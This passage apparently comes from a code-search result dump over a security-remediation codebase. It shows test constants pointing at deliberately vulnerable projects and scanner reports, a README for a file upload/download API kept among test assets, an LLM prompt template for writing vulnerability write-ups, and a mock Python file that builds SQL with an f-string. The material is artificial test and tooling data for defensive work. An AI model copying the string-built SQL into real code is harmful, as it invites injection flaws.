MOBB_SVJP: {\\n      UPLOAD_FILE: {\\n        CHECKMARX: getUploadFile('files/svjp/checkmarx.json'),\\n      },\\n      GIT_REPO: 'https://github.com/mobb-dev/simple-vulnerable-java-project',\\n      REFERENCE: 'main',\\n      REPO_ARCHIVE: getUploadFile('files/svjp/repo.zip'),\\n    } as TestData,","originalContents":"\\n\\nexport const CONSTANTS = {\\n  DATA: {\\n    EMPTY: {\\n      UPLOAD_FILE: {\\n        SEMGREP: getUploadFile('files/empty/semgrep.json'),\\n      },\\n      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n      REPO_ARCHIVE: getUploadFile('files/empty/repo.zip'),\\n    } as TestData,\\n    WEBGOAT_MINIMAL: {\\n      UPLOAD_FILE: {\\n        //filtered report leaving only 6 sqli findings with fixes that have conflicts\\n        CHECKMARX: getUploadFile('files/webgoat/checkmarx-minimal.json'),\\n      },\\n      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n    } as TestData,\\n    WEBGOAT: {\\n      UPLOAD_FILE: {\\n        CODEQL: getUploadFile('files/webgoat/codeql.json'),\\n        CHECKMARX: getUploadFile('files/webgoat/checkmarx.json'),\\n        CHECKMARX_XML: getUploadFile('files/webgoat/checkmarx.xml'),\\n        SNYK: getUploadFile('files/webgoat/snyk.json'),\\n        FORTIFY: getUploadFile('files/webgoat/scandata.fpr'),\\n        SONARQUBE: getUploadFile('files/webgoat/sonarqube.json'),\\n      },\\n      GIT_REPO: 'https://github.com/WebGoat/WebGoat',\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n      REPO_ARCHIVE: getUploadFile('files/webgoat/repo.zip'),\\n    } as TestData,\\n    MOBB_SVJP: {\\n      UPLOAD_FILE: {\\n        CHECKMARX: getUploadFile('files/svjp/checkmarx.json'),\\n      },\\n      GIT_REPO: 'https://github.com/mobb-dev/simple-vulnerable-java-project',\\n      REFERENCE: 'main',\\n      REPO_ARCHIVE: getUploadFile('files/svjp/repo.zip'),\\n    } as TestData,","detailedLines":[{"text":"export function getUploadFile(filename: string): UploadFile {","lineNumber":56,"isSignature":true},{"text":" fs.readFileSync(path.resolve(process.cwd(), filename)),","lineNumber":59},{"text":"  }","lineNumber":60},{"text":"}","lineNumber":61,"isSignature":true},{"lineNumber":62},{"text":"export const CONSTANTS = {","lineNumber":63},{"text":"  DATA: {","lineNumber":64},{"text":"    EMPTY: {","lineNumber":65},{"text":"      UPLOAD_FILE: {","lineNumber":66},{"text":"        SEMGREP: getUploadFile('files/empty/semgrep.json'),","lineNumber":67},{"text":"      },","lineNumber":68},{"text":"      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',","lineNumber":69},{"text":"      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',","lineNumber":70},{"text":"      REPO_ARCHIVE: getUploadFile('files/empty/repo.zip'),","lineNumber":71},{"text":"    } as TestData,","lineNumber":72},{"text":"    WEBGOAT_MINIMAL: {","lineNumber":73},{"text":"      UPLOAD_FILE: {","lineNumber":74},{"text":"        //filtered report leaving only 6 sqli findings with fixes that have conflicts","lineNumber":75},{"text":"        CHECKMARX: getUploadFile('files/webgoat/checkmarx-minimal.json'),","lineNumber":76},{"text":"      },","lineNumber":77},{"text":"      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',","lineNumber":78},{"text":"      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',","lineNumber":79},{"text":"    } as TestData,","lineNumber":80},{"text":"    WEBGOAT: {","lineNumber":81},{"text":"      UPLOAD_FILE: {","lineNumber":82},{"text":"        CODEQL: getUploadFile('files/webgoat/codeql.json'),","lineNumber":83},{"text":"        CHECKMARX: getUploadFile('files/webgoat/checkmarx.json'),","lineNumber":84},{"text":"        CHECKMARX_XML: getUploadFile('files/webgoat/checkmarx.xml'),","lineNumber":85},{"text":"        SNYK: getUploadFile('files/webgoat/snyk.json'),","lineNumber":86},{"text":"        FORTIFY: getUploadFile('files/webgoat/scandata.fpr'),","lineNumber":87},{"text":"        SONARQUBE: getUploadFile('files/webgoat/sonarqube.json'),","lineNumber":88},{"text":"      },","lineNumber":89},{"text":"      GIT_REPO: 'https://github.com/WebGoat/WebGoat',","lineNumber":90},{"text":"      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',","lineNumber":91},{"text":"      REPO_ARCHIVE: getUploadFile('files/webgoat/repo.zip'),","lineNumber":92},{"text":"    } as TestData,","lineNumber":93},{"text":"    MOBB_SVJP: {","lineNumber":94},{"text":"      UPLOAD_FILE: {","lineNumber":95},{"text":"        CHECKMARX: getUploadFile('files/svjp/checkmarx.json'),","lineNumber":96},{"text":"      },","lineNumber":97},{"text":"      GIT_REPO: 'https://github.com/mobb-dev/simple-vulnerable-java-project',","lineNumber":98},{"text":"      REFERENCE: 'main',","lineNumber":99},{"text":"      REPO_ARCHIVE: getUploadFile('files/svjp/repo.zip'),","lineNumber":100},{"text":"    } as TestData,","lineNumber":101},{"text":"    ALTOROJ: {","lineNumber":102},{"text":"      UPLOAD_FILE:","lineNumber":103},{"text":",","lineNumber":232},{"text":"}","lineNumber":233}]},"score":0.32742080092430115},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/java/pt/e-1488/source/README.md","range":{"startPosition":{},"endPosition":{"line":82}},"contents":"# File Upload/Download REST API\\n\\nA simple Java REST API built with Spring Boot that allows users to upload files and download them later.\\n\\n## Features\\n\\n- **File Upload**: Upload files with automatic unique filename generation\\n- **File Download**: Download files by filename\\n- **File Listing**: List all uploaded files\\n- **File Deletion**: Delete files by filename\\n- **File Information**: Get file metadata (size, last modified)\\n- **Web Interface**: Simple HTML interface for testing the API\\n\\n## Prerequisites\\n\\n- Java 17 or higher\\n- Maven 3.6 or higher\\n\\n## Quick Start\\n\\n### 1. Build the Application\\n\\n\`\`\`bash\\nmvn clean install\\n\`\`\`\\n\\n### 2. Run the Application\\n\\n\`\`\`bash\\nmvn spring-boot:run\\n\`\`\`\\n\\nThe application will start on \`http://localhost:8080\`\\n\\n### 3. Access the Web Interface\\n\\nOpen your browser and navigate to \`http://localhost:8080\` to access the web interface for testing the API.\\n\\n## API Endpoints\\n\\n### Upload File\\n- **URL**: \`POST /api/files/upload\`\\n- **Content-Type**: \`multipart/form-data\`\\n- **Parameter**: \`file\` (the file to upload)\\n- **Response**: JSON with success message and generated filename\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl -X POST -F \\"file=@/path/to/your/file.txt\\" http://localhost:8080/api/files/upload\\n\`\`\`\\n\\n### Download File\\n- **URL**: \`GET /api/files/download?filename={filename}\`\\n- **Response**: File download with appropriate headers\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl -O -J \\"http://localhost:8080/api/files/download?filename={filename}\\"\\n\`\`\`\\n\\n### List Files\\n- **URL**: \`GET /api/files/list\`\\n- **Response**: JSON with list of all uploaded files\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl http://localhost:8080/api/files/list\\n\`\`\`\\n\\n### Delete File\\n- **URL**: \`DELETE /api/files/delete?filename={filename}\`\\n- **Response**: JSON with success message\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl -X DELETE \\"http://localhost:8080/api/files/delete?filename={filename}\\"\\n\`\`\`\\n\\n### Get File Information\\n- **URL**: \`GET /api/files/info?filename={filename}\`\\n","originalContents":"# File Upload/Download REST API\\n\\nA simple Java REST API built with Spring Boot that allows users to upload files and download them later.\\n\\n## Features\\n\\n- **File Upload**: Upload files with automatic unique filename generation\\n- **File Download**: Download files by filename\\n- **File Listing**: List all uploaded files\\n- **File Deletion**: Delete files by filename\\n- **File Information**: Get file metadata (size, last modified)\\n- **Web Interface**: Simple HTML interface for testing the API\\n\\n## Prerequisites\\n\\n- Java 17 or higher\\n- Maven 3.6 or higher\\n\\n## Quick Start\\n\\n### 1. Build the Application\\n\\n\`\`\`bash\\nmvn clean install\\n\`\`\`\\n\\n### 2. Run the Application\\n\\n\`\`\`bash\\nmvn spring-boot:run\\n\`\`\`\\n\\nThe application will start on \`http://localhost:8080\`\\n\\n### 3. Access the Web Interface\\n\\nOpen your browser and navigate to \`http://localhost:8080\` to access the web interface for testing the API.\\n\\n## API Endpoints\\n\\n### Upload File\\n- **URL**: \`POST /api/files/upload\`\\n- **Content-Type**: \`multipart/form-data\`\\n- **Parameter**: \`file\` (the file to upload)\\n- **Response**: JSON with success message and generated filename\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl -X POST -F \\"file=@/path/to/your/file.txt\\" http://localhost:8080/api/files/upload\\n\`\`\`\\n\\n### Download File\\n- **URL**: \`GET /api/files/download?filename={filename}\`\\n- **Response**: File download with appropriate headers\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl -O -J \\"http://localhost:8080/api/files/download?filename={filename}\\"\\n\`\`\`\\n\\n### List Files\\n- **URL**: \`GET /api/files/list\`\\n- **Response**: JSON with list of all uploaded files\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl http://localhost:8080/api/files/list\\n\`\`\`\\n\\n### Delete File\\n- **URL**: \`DELETE /api/files/delete?filename={filename}\`\\n- **Response**: JSON with success message\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl -X DELETE \\"http://localhost:8080/api/files/delete?filename={filename}\\"\\n\`\`\`\\n\\n### Get File Information\\n- **URL**: \`GET /api/files/info?filename={filename}\`\\n","detailedLines":[{"text":"# File Upload/Download REST API","lineNumber":1},{"lineNumber":2},{"text":"A simple Java REST API built with Spring Boot that allows users to upload files and download them later.","lineNumber":3},{"lineNumber":4},{"text":"## Features","lineNumber":5},{"lineNumber":6},{"text":"- **File Upload**: Upload files with automatic unique filename generation","lineNumber":7},{"text":"- **File Download**: Download files by filename","lineNumber":8},{"text":"- **File Listing**: List all uploaded files","lineNumber":9},{"text":"- **File Deletion**: Delete files by filename","lineNumber":10},{"text":"- **File Information**: Get file metadata (size, last modified)","lineNumber":11},{"text":"- **Web Interface**: Simple HTML interface for testing the API","lineNumber":12},{"lineNumber":13},{"text":"## Prerequisites","lineNumber":14},{"lineNumber":15},{"text":"- Java 17 or higher","lineNumber":16},{"text":"- Maven 3.6 or higher","lineNumber":17},{"lineNumber":18},{"text":"## Quick Start","lineNumber":19},{"lineNumber":20},{"text":"### 1. Build the Application","lineNumber":21},{"lineNumber":22},{"text":"\`\`\`bash","lineNumber":23},{"text":"mvn clean install","lineNumber":24},{"text":"\`\`\`","lineNumber":25},{"lineNumber":26},{"text":"### 2. Run the Application","lineNumber":27},{"lineNumber":28},{"text":"\`\`\`bash","lineNumber":29},{"text":"mvn spring-boot:run","lineNumber":30},{"text":"\`\`\`","lineNumber":31},{"lineNumber":32},{"text":"The application will start on \`http://localhost:8080\`","lineNumber":33},{"lineNumber":34},{"text":"### 3. Access the Web Interface","lineNumber":35},{"lineNumber":36},{"text":"Open your browser and navigate to \`http://localhost:8080\` to access the web interface for testing the API.","lineNumber":37},{"lineNumber":38},{"text":"## API Endpoints","lineNumber":39},{"lineNumber":40},{"text":"### Upload File","lineNumber":41},{"text":"- **URL**: \`POST /api/files/upload\`","lineNumber":42},{"text":"- **Content-Type**: \`multipart/form-data\`","lineNumber":43},{"text":"- **Parameter**: \`file\` (the file to upload)","lineNumber":44},{"text":"- **Response**: JSON with success message and generated filename","lineNumber":45},{"lineNumber":46},{"text":"**Example using curl:**","lineNumber":47},{"text":"\`\`\`bash","lineNumber":48},{"text":"curl -X POST -F \\"file=@/path/to/your/file.txt\\" http://localhost:8080/api/files/upload","lineNumber":49},{"text":"\`\`\`","lineNumber":50},{"lineNumber":51},{"text":"### Download File","lineNumber":52},{"text":"- **URL**: \`GET /api/files/download?filename={filename}\`","lineNumber":53},{"text":"- **Response**: File download with appropriate headers","lineNumber":54},{"lineNumber":55},{"text":"**Example using curl:**","lineNumber":56},{"text":"\`\`\`bash","lineNumber":57},{"text":"curl -O -J \\"http://localhost:8080/api/files/download?filename={filename}\\"","lineNumber":58},{"text":"\`\`\`","lineNumber":59},{"lineNumber":60},{"text":"### List Files","lineNumber":61},{"text":"- **URL**: \`GET /api/files/list\`","lineNumber":62},{"text":"- **Response**: JSON with list of all uploaded files","lineNumber":63},{"lineNumber":64},{"text":"**Example using curl:**","lineNumber":65},{"text":"\`\`\`bash","lineNumber":66},{"text":"curl http://localhost:8080/api/files/list","lineNumber":67},{"text":"\`\`\`","lineNumber":68},{"lineNumber":69},{"text":"### Delete File","lineNumber":70},{"text":"- **URL**: \`DELETE /api/files/delete?filename={filename}\`","lineNumber":71},{"text":"- **Response**: JSON with success message","lineNumber":72},{"lineNumber":73},{"text":"**Example using curl:**","lineNumber":74},{"text":"\`\`\`bash","lineNumber":75},{"text":"curl -X DELETE \\"http://localhost:8080/api/files/delete?filename={filename}\\"","lineNumber":76},{"text":"\`\`\`","lineNumber":77},{"lineNumber":78},{"text":"### Get File Information","lineNumber":79},{"text":"- **URL**: \`GET /api/files/info?filename={filename}\`","lineNumber":80},{"text":"- **Response**: JSON with file metadata (size, last modified)","lineNumber":81}]},"score":0.31596270203590393},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/generator/prompt_files/markdown_system_prompt.txt","range":{"startPosition":{},"endPosition":{"line":44}},"contents":"You are an expert in software security and technical documentation. You are tasked with generating a structured vulnerability.md file for a given software vulnerability. The file must follow the exact markdown format provided below and include all relevant technical details. Ensure your explanations are accurate, examples are syntactically correct, and sections are complete.\\n\\nUse the following format:\\n\`\`\`\\n# {vuln_name}\\n\\n## 1. Vulnerability Description\\n\\n[Describe the vulnerability here]\\n\\n## 2. How It Works\\n\\n[Explain how the vulnerability works]\\n\\n## 3. Vulnerable Code Examples\\n\\n### Example 1\\n\`\`\`{language}\\n// Add vulnerable code example here\\n\`\`\`\\n\\n## 4. Remediation Strategies\\n\\n### Safe Code Examples\\n\`\`\`{language}\\n// Add safe code example here\\n\`\`\`\\n\\n## 5. False Positives Detection\\n\\n### More Safe Code Examples\\n\`\`\`{language}\\n// Add more safe code example here or refer to previous examples\\n\`\`\`\\n\\n## 5. Other Information\\n\\n\\n\\n### Read More\\n\\n* https://example_documentation.com\\n\\n\`\`\`\\n","originalContents":"You are an expert in software security and technical documentation. You are tasked with generating a structured vulnerability.md file for a given software vulnerability. The file must follow the exact markdown format provided below and include all relevant technical details. Ensure your explanations are accurate, examples are syntactically correct, and sections are complete.\\n\\nUse the following format:\\n\`\`\`\\n# {vuln_name}\\n\\n## 1. Vulnerability Description\\n\\n[Describe the vulnerability here]\\n\\n## 2. How It Works\\n\\n[Explain how the vulnerability works]\\n\\n## 3. Vulnerable Code Examples\\n\\n### Example 1\\n\`\`\`{language}\\n// Add vulnerable code example here\\n\`\`\`\\n\\n## 4. Remediation Strategies\\n\\n### Safe Code Examples\\n\`\`\`{language}\\n// Add safe code example here\\n\`\`\`\\n\\n## 5. False Positives Detection\\n\\n### More Safe Code Examples\\n\`\`\`{language}\\n// Add more safe code example here or refer to previous examples\\n\`\`\`\\n\\n## 5. Other Information\\n\\n\\n\\n### Read More\\n\\n* https://example_documentation.com\\n\\n\`\`\`\\n","detailedLines":[{"text":"You are an expert in software security and technical documentation. You are tasked with generating a structured vulnerability.md file for a given software vulnerability. The file must follow the exact markdown format provided below and include all relevant technical details. Ensure your explanations are accurate, examples are syntactically correct, and sections are complete.","lineNumber":1},{"lineNumber":2},{"text":"Use the following format:","lineNumber":3},{"text":"\`\`\`","lineNumber":4},{"text":"# {vuln_name}","lineNumber":5},{"lineNumber":6},{"text":"## 1. Vulnerability Description","lineNumber":7},{"lineNumber":8},{"text":"[Describe the vulnerability here]","lineNumber":9},{"lineNumber":10},{"text":"## 2. How It Works","lineNumber":11},{"lineNumber":12},{"text":"[Explain how the vulnerability works]","lineNumber":13},{"lineNumber":14},{"text":"## 3. Vulnerable Code Examples","lineNumber":15},{"lineNumber":16},{"text":"### Example 1","lineNumber":17},{"text":"\`\`\`{language}","lineNumber":18},{"text":"// Add vulnerable code example here","lineNumber":19},{"text":"\`\`\`","lineNumber":20},{"lineNumber":21},{"text":"## 4. Remediation Strategies","lineNumber":22},{"lineNumber":23},{"text":"### Safe Code Examples","lineNumber":24},{"text":"\`\`\`{language}","lineNumber":25},{"text":"// Add safe code example here","lineNumber":26},{"text":"\`\`\`","lineNumber":27},{"lineNumber":28},{"text":"## 5. False Positives Detection","lineNumber":29},{"lineNumber":30},{"text":"### More Safe Code Examples","lineNumber":31},{"text":"\`\`\`{language}","lineNumber":32},{"text":"// Add more safe code example here or refer to previous examples","lineNumber":33},{"text":"\`\`\`","lineNumber":34},{"lineNumber":35},{"text":"## 5. Other Information","lineNumber":36},{"lineNumber":37},{"lineNumber":38},{"lineNumber":39},{"text":"### Read More","lineNumber":40},{"lineNumber":41},{"text":"* https://example_documentation.com","lineNumber":42},{"lineNumber":43},{"text":"\`\`\`","lineNumber":44}]},"score":0.3146929144859314},{"codeBlock":{"relativeWorkspacePath":"services/node_general_backend/src/maintenance/try_now.ts","range":{"startPosition":{},"endPosition":{"line":55,"column":1}},"contents":"import path from 'node:path'\\n\\nimport {\\n  Projects,\\n  Vendors,\\n} from '../servers/vulnerability_report/vuln_report_generates'\\n\\nconst DATA_DIR = path.join(__dirname, 'try_now')\\n\\nexport const TRY_NOW_PROJECTS = {\\n  [Projects.JuiceShop]: {\\n    url: 'https://github.com/juice-shop/juice-shop',\\n    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',\\n    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),\\n    },\\n  },\\n  [Projects.Webgoat]: {\\n    url: 'https://github.com/WebGoat/WebGoat',\\n    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),\\n    },\\n  },","originalContents":"import path from 'node:path'\\n\\nimport {\\n  Projects,\\n  Vendors,\\n} from '../servers/vulnerability_report/vuln_report_generates'\\n\\nconst DATA_DIR = path.join(__dirname, 'try_now')\\n\\nexport const TRY_NOW_PROJECTS = {\\n  [Projects.JuiceShop]: {\\n    url: 'https://github.com/juice-shop/juice-shop',\\n    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',\\n    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),\\n    },\\n  },\\n  [Projects.Webgoat]: {\\n    url: 'https://github.com/WebGoat/WebGoat',\\n    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),\\n    },\\n  },","detailedLines":[{"text":"import path from 'node:path'","lineNumber":1},{"lineNumber":2},{"text":"import {","lineNumber":3},{"text":"  Projects,","lineNumber":4},{"text":"  Vendors,","lineNumber":5},{"text":"} from '../servers/vulnerability_report/vuln_report_generates'","lineNumber":6},{"lineNumber":7},{"text":"const DATA_DIR = path.join(__dirname, 'try_now')","lineNumber":8},{"lineNumber":9},{"text":"export const TRY_NOW_PROJECTS = {","lineNumber":10},{"text":"  [Projects.JuiceShop]: {","lineNumber":11},{"text":"    url: 'https://github.com/juice-shop/juice-shop',","lineNumber":12},{"text":"    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',","lineNumber":13},{"text":"    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),","lineNumber":14},{"text":"    reportFiles: {","lineNumber":15},{"text":"      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),","lineNumber":16},{"text":"      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),","lineNumber":17},{"text":"      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),","lineNumber":18},{"text":"      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),","lineNumber":19},{"text":"      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),","lineNumber":20},{"text":"      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),","lineNumber":21},{"text":"      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),","lineNumber":22},{"text":"      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),","lineNumber":23},{"text":"    },","lineNumber":24},{"text":"  },","lineNumber":25},{"text":"  [Projects.Webgoat]: {","lineNumber":26},{"text":"    url: 'https://github.com/WebGoat/WebGoat',","lineNumber":27},{"text":"    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',","lineNumber":28},{"text":"    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),","lineNumber":29},{"text":"    reportFiles: {","lineNumber":30},{"text":"      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),","lineNumber":31},{"text":"      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),","lineNumber":32},{"text":"      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),","lineNumber":33},{"text":"      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),","lineNumber":34},{"text":"      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),","lineNumber":35},{"text":"      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),","lineNumber":36},{"text":"      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),","lineNumber":37},{"text":"      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),","lineNumber":38},{"text":"    },","lineNumber":39},{"text":"  },","lineNumber":40},{"text":"  [Projects.Altoroj]: {","lineNumber":41},{"text":"    url: 'https://github.com/HCL-TECH-SOFTWARE/AltoroJ'","lineNumber":42},{"text":",","lineNumber":55},{"text":"}","lineNumber":56}]},"score":0.3024810552597046},{"codeBlock":{"relativeWorkspacePath":"patchino/ai-playground/src/components/mock.ts","range":{"startPosition":{},"endPosition":{"line":362,"column":1}},"contents":"export const mockFile = \`downloadFileimport argparse\\nimport collections\\nimport datetime\\nimport grpc\\nimport itertools\\nimport numpy as np\\nimport os\\nimport pandas as pd\\nimport pandas.io.sql as sqlio\\nimport subprocess\\nimport time\\nimport streamlit as st\\nfrom collections import defaultdict\\nimport plotly.express as px\\n\\nfrom google.protobuf import timestamp_pb2\\n\\nfrom cresta.v1.analytics import analytics_service_pb2\\nfrom cresta.v1.analytics import analytics_service_pb2_grpc\\nfrom cresta.v1.analytics import common_pb2\\nfrom cresta.v1.analytics import qa_stats_pb2\\nfrom cresta.v1.user import user_pb2\\n\\nfrom greyparrot.common import Customer\\nfrom greyparrot.conversations.db import ConversationsDBConn\\n\\nst.write(\\"\\"\\"# Coaching Report #\\"\\"\\")\\n\\nport_forward_ports_and_processes = {\\n    'chat-prod': (8081, None),\\n    'voice-prod': (8082, None),\\n    'us-west-2-prod': (8083, None),\\n}\\n\\nall_customers = [{\\n    'display_name': f'{display_name} ({customer_name})',\\n    'name': customer_name,\\n    'customer_id': customer_id,\\n    'profile_id': profile_id,\\n    'prod_env_name': prod_env_name,\\n    'domain': domain,\\n} for display_name, customer_name, customer_id, profile_id, prod_env_name, domain in sorted(\\n    list(\\n        set((c.pretty_name or c.name.value, c.name.value, c.customer_id, c.profile_id,\\n             c.prod_env_name, c.domain) for c in Customer.all()\\n            if c.prod_env_name in port_forward_ports_and_processes.keys())))]\\n\\ndef build_coaching_plan_url(customer, agent_user_id, coaching_plan_id):\\n    return f\\"{customer['domain']}/director/coaching/workflow/agent/{agent_user_id}/plan/{coaching_plan_id}\\"\\n\\n@st.cache_data\\ndef load_coaching_data(customer_display_name, num_last_days, num_days):\\n    if not customer_display_name:\\n        return None\\n\\n    current_datetime = datetime.datetime.now(datetime.timezone.utc)\\n    first_session_days = current_datetime - datetime.timedelta(days=num_last_days)\\n    last_session_days = current_datetime - datetime.timedelta(days=num_days)\\n\\n    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)\\n\\n    db_conn = ConversationsDBConn.from_customer_name(customer['name'])\\n    conn = db_conn.session.connection().connection\\n\\n    user_id_name = {}\\n    scorecard_template_id_name_map = {}\\n    template_criteria_id_name_map = {}\\n    coaching_sessions = []\\n\\n    with conn.cursor() as cursor:\\n        cursor.execute(f\\"\\"\\"\\n            SELECT\\n                coaching_plans.resource_id as coaching_plan_id,\\n                cu.full_name as creator_user_name,\\n                cu.user_id as creator_user_id,\\n                COALESCE(su.full_name, '') as submitter_user_name,\\n                COALESCE(su.user_id, '') as submitter_user_id,\\n                coaching_sessions.session_at as session_time,\\n                coaching_plans.focus_criteria_ids as focus_behaviors,\\n                au.full_name as agent_user_name,\\n                au.user_id as agent_user_id,\\n                coaching_sessions.resource_id as session_id,\\n                coaching_sessions.usecase_id as usecase\\n            FROM director.coaching_plans \\n                JOIN director.coaching_sessions ON coaching_plans.resource_id = coaching_sessions.coaching_plan_id\\n                JOIN app.users as cu ON coaching_sessions.creator_user_id = cu.user_id\\n                LEFT JOIN app.users as su ON coaching_sessions.manager_submitter_user_id = su.user_id\\n                JOIN app.users as au ON coaching_plans.agent_user_id = au.user_id\\n            WHERE coaching_sessions.manager_submitted_at > '{first_session_days.strftime(\\"%Y-%m-%d\\")}'\\n                AND coaching_sessions.session_at <= '{last_session_days.strftime(\\"%Y-%m-%d\\")}'\\n            \\"\\"\\")\\n        \\n        rows = cursor.fetchall()\\n        for session_note in rows:\\n            if session_note[6] is not None and len(session_note[6]) > 0:\\n                focus_criteria = session_note[6]\\n                for criteria in focus_criteria:\\n                    ids = criteria.split('/')\\n                    scorecard_template_id_name_map[ids[0]] = ''\\n                    coaching_sessions.append({\\n                        \\"session_id\\": session_note[9],\\n                        \\"usecase\\": session_note[10],\\n                        \\"coaching_plan_id\\": session_note[0],\\n                        \\"coaching_plan_url\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),\\n                        \\"creator_user_name\\": session_note[1],\\n                        \\"creator_user_id\\": session_note[2],\\n                        \\"submitter_user_name\\": session_note[3],\\n                        \\"submitter_user_id\\": session_note[4],\\n                        \\"session_time\\": session_note[5],\\n                        \\"focus_criteria_template_id\\": ids[0],\\n                        \\"focus_criteria_id\\": ids[1],\\n                        \\"agent_user_name\\": session_note[7],\\n                        \\"agent_user_id\\": session_note[8],\\n                        \\"before_score\\": -1,\\n                        \\"before_convo_count\\": 0,\\n                        \\"after_score\\": -1,\\n                        \\"after_convo_count\\": 0,\\n                    })\\n            else:\\n                coaching_sessions.append({\\n                    \\"session_id\\": session_note[9],\\n                    \\"coaching_plan_id\\": session_note[0],\\n                    \\"coaching_plan_url\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),\\n                    \\"creator_user_name\\": 